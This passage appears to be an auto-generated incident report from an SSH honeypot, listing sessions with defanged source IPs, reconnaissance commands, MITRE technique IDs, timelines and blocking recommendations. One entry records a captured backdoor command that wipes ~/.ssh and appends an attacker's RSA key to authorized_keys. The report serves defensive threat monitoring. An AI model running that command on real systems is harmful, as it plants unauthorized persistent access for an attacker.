| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:19:21` | `cowrie.session.connect` |
| `2026-07-24 19:19:22` | `cowrie.client.version` |
| `2026-07-24 19:19:22` | `cowrie.client.kex` |
| `2026-07-24 19:19:26` | `cowrie.login.success` |
| `2026-07-24 19:19:29` | `cowrie.session.params` |
| `2026-07-24 19:19:29` | `cowrie.command.input` |
| `2026-07-24 19:19:29` | `cowrie.command.input` |
| `2026-07-24 19:19:29` | `cowrie.command.input` |
| `2026-07-24 19:19:29` | `cowrie.command.input` |
| `2026-07-24 19:19:29` | `cowrie.command.input` |
| `2026-07-24 19:19:29` | `cowrie.command.success` |
| `2026-07-24 19:19:29` | `cowrie.command.input` |
| `2026-07-24 19:19:29` | `cowrie.command.input` |
| `2026-07-24 19:19:29` | `cowrie.command.input` |
| `2026-07-24 19:19:29` | `cowrie.command.input` |
| `2026-07-24 19:19:30` | `cowrie.log.closed` |
| `2026-07-24 19:19:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecf7bb0c751a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:19 |
| **Last Seen** | 2026-07-24 19:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:19:54` | `cowrie.session.connect` |
| `2026-07-24 19:19:54` | `cowrie.client.version` |
| `2026-07-24 19:19:54` | `cowrie.client.kex` |
| `2026-07-24 19:19:55` | `cowrie.login.success` |
| `2026-07-24 19:19:56` | `cowrie.session.params` |
| `2026-07-24 19:19:56` | `cowrie.command.input` |
| `2026-07-24 19:19:56` | `cowrie.command.input` |
| `2026-07-24 19:19:56` | `cowrie.command.input` |
| `2026-07-24 19:19:56` | `cowrie.command.input` |
| `2026-07-24 19:19:56` | `cowrie.command.input` |
| `2026-07-24 19:19:56` | `cowrie.command.success` |
| `2026-07-24 19:19:56` | `cowrie.command.input` |
| `2026-07-24 19:19:56` | `cowrie.command.input` |
| `2026-07-24 19:19:56` | `cowrie.command.input` |
| `2026-07-24 19:19:56` | `cowrie.command.input` |
| `2026-07-24 19:19:56` | `cowrie.log.closed` |
| `2026-07-24 19:19:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf872a66ac3c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:20 |
| **Last Seen** | 2026-07-24 19:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:20:32` | `cowrie.session.connect` |
| `2026-07-24 19:20:33` | `cowrie.client.version` |
| `2026-07-24 19:20:33` | `cowrie.client.kex` |
| `2026-07-24 19:20:36` | `cowrie.login.success` |
| `2026-07-24 19:20:39` | `cowrie.session.params` |
| `2026-07-24 19:20:39` | `cowrie.command.input` |
| `2026-07-24 19:20:39` | `cowrie.command.input` |
| `2026-07-24 19:20:39` | `cowrie.command.input` |
| `2026-07-24 19:20:39` | `cowrie.command.input` |
| `2026-07-24 19:20:39` | `cowrie.command.input` |
| `2026-07-24 19:20:39` | `cowrie.command.success` |
| `2026-07-24 19:20:39` | `cowrie.command.input` |
| `2026-07-24 19:20:39` | `cowrie.command.input` |
| `2026-07-24 19:20:39` | `cowrie.command.input` |
| `2026-07-24 19:20:39` | `cowrie.command.input` |
| `2026-07-24 19:20:40` | `cowrie.log.closed` |
| `2026-07-24 19:20:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03f74f8c16b3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:21 |
| **Last Seen** | 2026-07-24 19:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:21:34` | `cowrie.session.connect` |
| `2026-07-24 19:21:34` | `cowrie.client.version` |
| `2026-07-24 19:21:35` | `cowrie.client.kex` |
| `2026-07-24 19:21:35` | `cowrie.login.success` |
| `2026-07-24 19:21:37` | `cowrie.session.params` |
| `2026-07-24 19:21:37` | `cowrie.command.input` |
| `2026-07-24 19:21:37` | `cowrie.command.input` |
| `2026-07-24 19:21:37` | `cowrie.command.input` |
| `2026-07-24 19:21:37` | `cowrie.command.input` |
| `2026-07-24 19:21:37` | `cowrie.command.input` |
| `2026-07-24 19:21:37` | `cowrie.command.success` |
| `2026-07-24 19:21:37` | `cowrie.command.input` |
| `2026-07-24 19:21:37` | `cowrie.command.input` |
| `2026-07-24 19:21:37` | `cowrie.command.input` |
| `2026-07-24 19:21:37` | `cowrie.command.input` |
| `2026-07-24 19:21:37` | `cowrie.log.closed` |
| `2026-07-24 19:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1416519a2aa

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:21 |
| **Last Seen** | 2026-07-24 19:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:21:42` | `cowrie.session.connect` |
| `2026-07-24 19:21:43` | `cowrie.client.version` |
| `2026-07-24 19:21:43` | `cowrie.client.kex` |
| `2026-07-24 19:21:47` | `cowrie.login.success` |
| `2026-07-24 19:21:49` | `cowrie.session.params` |
| `2026-07-24 19:21:49` | `cowrie.command.input` |
| `2026-07-24 19:21:49` | `cowrie.command.input` |
| `2026-07-24 19:21:49` | `cowrie.command.input` |
| `2026-07-24 19:21:49` | `cowrie.command.input` |
| `2026-07-24 19:21:49` | `cowrie.command.input` |
| `2026-07-24 19:21:49` | `cowrie.command.success` |
| `2026-07-24 19:21:49` | `cowrie.command.input` |
| `2026-07-24 19:21:49` | `cowrie.command.input` |
| `2026-07-24 19:21:49` | `cowrie.command.input` |
| `2026-07-24 19:21:49` | `cowrie.command.input` |
| `2026-07-24 19:21:51` | `cowrie.log.closed` |
| `2026-07-24 19:21:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1357a416c897

| Field | Detail |
|---|---|
| **Source IP** | `123.160.165[.]208` |
| **First Seen** | 2026-07-24 19:21 |
| **Last Seen** | 2026-07-24 19:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:21:53` | `cowrie.session.connect` |
| `2026-07-24 19:21:53` | `cowrie.client.version` |
| `2026-07-24 19:21:54` | `cowrie.client.kex` |
| `2026-07-24 19:21:55` | `cowrie.login.success` |
| `2026-07-24 19:21:56` | `cowrie.session.params` |
| `2026-07-24 19:21:56` | `cowrie.command.input` |
| `2026-07-24 19:21:56` | `cowrie.command.failed` |
| `2026-07-24 19:21:56` | `cowrie.log.closed` |
| `2026-07-24 19:21:57` | `cowrie.session.params` |
| `2026-07-24 19:21:57` | `cowrie.command.input` |
| `2026-07-24 19:21:58` | `cowrie.session.file_download` |
| `2026-07-24 19:21:58` | `cowrie.log.closed` |
| `2026-07-24 19:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.160.165[.]208` to AbuseIPDB if not already reported
- [ ] Block `123.160.165[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c12035c53290

| Field | Detail |
|---|---|
| **Source IP** | `123.160.165[.]208` |
| **First Seen** | 2026-07-24 19:21 |
| **Last Seen** | 2026-07-24 19:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:21:58` | `cowrie.session.connect` |
| `2026-07-24 19:21:58` | `cowrie.client.version` |
| `2026-07-24 19:21:58` | `cowrie.client.kex` |
| `2026-07-24 19:21:59` | `cowrie.login.success` |
| `2026-07-24 19:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.160.165[.]208` to AbuseIPDB if not already reported
- [ ] Block `123.160.165[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e46553deca0

| Field | Detail |
|---|---|
| **Source IP** | `123.160.165[.]208` |
| **First Seen** | 2026-07-24 19:22 |
| **Last Seen** | 2026-07-24 19:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:22:00` | `cowrie.session.connect` |
| `2026-07-24 19:22:00` | `cowrie.client.version` |
| `2026-07-24 19:22:00` | `cowrie.client.kex` |
| `2026-07-24 19:22:01` | `cowrie.login.success` |
| `2026-07-24 19:22:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.160.165[.]208` to AbuseIPDB if not already reported
- [ ] Block `123.160.165[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17a0d7d8eccf

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:22 |
| **Last Seen** | 2026-07-24 19:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:22:52` | `cowrie.session.connect` |
| `2026-07-24 19:22:53` | `cowrie.client.version` |
| `2026-07-24 19:22:53` | `cowrie.client.kex` |
| `2026-07-24 19:22:57` | `cowrie.login.success` |
| `2026-07-24 19:23:00` | `cowrie.session.params` |
| `2026-07-24 19:23:00` | `cowrie.command.input` |
| `2026-07-24 19:23:00` | `cowrie.command.input` |
| `2026-07-24 19:23:00` | `cowrie.command.input` |
| `2026-07-24 19:23:00` | `cowrie.command.input` |
| `2026-07-24 19:23:00` | `cowrie.command.input` |
| `2026-07-24 19:23:00` | `cowrie.command.success` |
| `2026-07-24 19:23:00` | `cowrie.command.input` |
| `2026-07-24 19:23:00` | `cowrie.command.input` |
| `2026-07-24 19:23:00` | `cowrie.command.input` |
| `2026-07-24 19:23:00` | `cowrie.command.input` |
| `2026-07-24 19:23:01` | `cowrie.log.closed` |
| `2026-07-24 19:23:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aec0cee5f4bb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:23 |
| **Last Seen** | 2026-07-24 19:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:23:19` | `cowrie.session.connect` |
| `2026-07-24 19:23:19` | `cowrie.client.version` |
| `2026-07-24 19:23:20` | `cowrie.client.kex` |
| `2026-07-24 19:23:20` | `cowrie.login.success` |
| `2026-07-24 19:23:22` | `cowrie.session.params` |
| `2026-07-24 19:23:22` | `cowrie.command.input` |
| `2026-07-24 19:23:22` | `cowrie.command.input` |
| `2026-07-24 19:23:22` | `cowrie.command.input` |
| `2026-07-24 19:23:22` | `cowrie.command.input` |
| `2026-07-24 19:23:22` | `cowrie.command.input` |
| `2026-07-24 19:23:22` | `cowrie.command.success` |
| `2026-07-24 19:23:22` | `cowrie.command.input` |
| `2026-07-24 19:23:22` | `cowrie.command.input` |
| `2026-07-24 19:23:22` | `cowrie.command.input` |
| `2026-07-24 19:23:22` | `cowrie.command.input` |
| `2026-07-24 19:23:22` | `cowrie.log.closed` |
| `2026-07-24 19:23:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b4818f5333f

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-24 19:23 |
| **Last Seen** | 2026-07-24 19:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:23:54` | `cowrie.session.connect` |
| `2026-07-24 19:23:55` | `cowrie.client.version` |
| `2026-07-24 19:23:55` | `cowrie.client.kex` |
| `2026-07-24 19:23:57` | `cowrie.login.success` |
| `2026-07-24 19:23:57` | `cowrie.direct-tcpip.request` |
| `2026-07-24 19:24:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c627a7109a0f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:24 |
| **Last Seen** | 2026-07-24 19:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:24:00` | `cowrie.session.connect` |
| `2026-07-24 19:24:01` | `cowrie.client.version` |
| `2026-07-24 19:24:01` | `cowrie.client.kex` |
| `2026-07-24 19:24:05` | `cowrie.login.success` |
| `2026-07-24 19:24:08` | `cowrie.session.params` |
| `2026-07-24 19:24:08` | `cowrie.command.input` |
| `2026-07-24 19:24:08` | `cowrie.command.input` |
| `2026-07-24 19:24:08` | `cowrie.command.input` |
| `2026-07-24 19:24:08` | `cowrie.command.input` |
| `2026-07-24 19:24:08` | `cowrie.command.input` |
| `2026-07-24 19:24:08` | `cowrie.command.success` |
| `2026-07-24 19:24:08` | `cowrie.command.input` |
| `2026-07-24 19:24:08` | `cowrie.command.input` |
| `2026-07-24 19:24:08` | `cowrie.command.input` |
| `2026-07-24 19:24:08` | `cowrie.command.input` |
| `2026-07-24 19:24:09` | `cowrie.log.closed` |
| `2026-07-24 19:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-397877dacc80

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 19:25 |
| **Last Seen** | 2026-07-24 19:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:25:08` | `cowrie.session.connect` |
| `2026-07-24 19:25:08` | `cowrie.client.version` |
| `2026-07-24 19:25:08` | `cowrie.client.kex` |
| `2026-07-24 19:25:09` | `cowrie.login.success` |
| `2026-07-24 19:25:10` | `cowrie.session.params` |
| `2026-07-24 19:25:10` | `cowrie.command.input` |
| `2026-07-24 19:25:10` | `cowrie.command.input` |
| `2026-07-24 19:25:10` | `cowrie.command.input` |
| `2026-07-24 19:25:10` | `cowrie.command.input` |
| `2026-07-24 19:25:10` | `cowrie.command.input` |
| `2026-07-24 19:25:10` | `cowrie.command.success` |
| `2026-07-24 19:25:10` | `cowrie.command.input` |
| `2026-07-24 19:25:10` | `cowrie.command.input` |
| `2026-07-24 19:25:10` | `cowrie.command.input` |
| `2026-07-24 19:25:10` | `cowrie.command.input` |
| `2026-07-24 19:25:10` | `cowrie.log.closed` |
| `2026-07-24 19:25:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45e6f47c66aa

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 19:25 |
| **Last Seen** | 2026-07-24 19:25 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 19:25:08` | `cowrie.session.connect` |
| `2026-07-24 19:25:10` | `cowrie.client.version` |
| `2026-07-24 19:25:10` | `cowrie.client.kex` |
| `2026-07-24 19:25:13` | `cowrie.login.success` |
| `2026-07-24 19:25:16` | `cowrie.session.params` |
| `2026-07-24 19:25:16` | `cowrie.command.input` |
| `2026-07-24 19:25:16` | `cowrie.command.input` |
| `2026-07-24 19:25:16` | `cowrie.command.input` |
| `2026-07-24 19:25:16` | `cowrie.command.input` |
| `2026-07-24 19:25:16` | `cowrie.command.input` |
| `2026-07-24 19:25:16` | `cowrie.command.success` |
| `2026-07-24 19:25:16` | `cowrie.command.input` |
| `2026-07-24 19:25:16` | `cowrie.command.input` |
| `2026-07-24 19:25:16` | `cowrie.command.input` |
| `2026-07-24 19:25:16` | `cowrie.command.input` |
| `2026-07-24 19:25:17` | `cowrie.log.closed` |
| `2026-07-24 19:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
